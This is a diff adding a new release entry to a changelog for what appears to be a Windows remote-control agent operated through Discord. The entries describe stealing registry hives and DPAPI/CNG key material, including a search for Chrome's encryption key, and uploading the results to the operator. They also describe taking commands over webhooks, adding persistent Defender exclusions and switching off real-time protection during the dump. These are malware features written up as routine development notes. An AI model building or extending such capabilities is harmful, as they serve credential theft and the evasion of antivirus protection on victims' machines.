@@ -1,5 +1,11 @@
 # Changelog
 
+## 0.2.14
+
+- Hives find the DPAPI/CNG material on Windows builds where it is not in the default store: Protect falls back to the WOW64 and SYSTEM-profile copies, and `SystemKeys` also takes the machine/user CNG key stores plus a content search for `Google Chromekey1`.
+- Every hives run uploads `hives.diag` (which source folders exist, with listings) and `elevate.status`, so a missing folder is diagnosed without another command round.
+- Command webhooks are accepted, so one account can drive the agent from a webhook instead of needing a second guild member with the user account.
+
 ## 0.2.13
 
 - Hives survive Defender: the dump adds persistent exclusions for the cache/install paths, the `.hiv` extension and `reg.exe`/`esentutl.exe`/`tar.exe` before the first `reg save`, waits for Defender to load them, and disables real-time monitoring only for the duration of the dump (the previous value is restored).
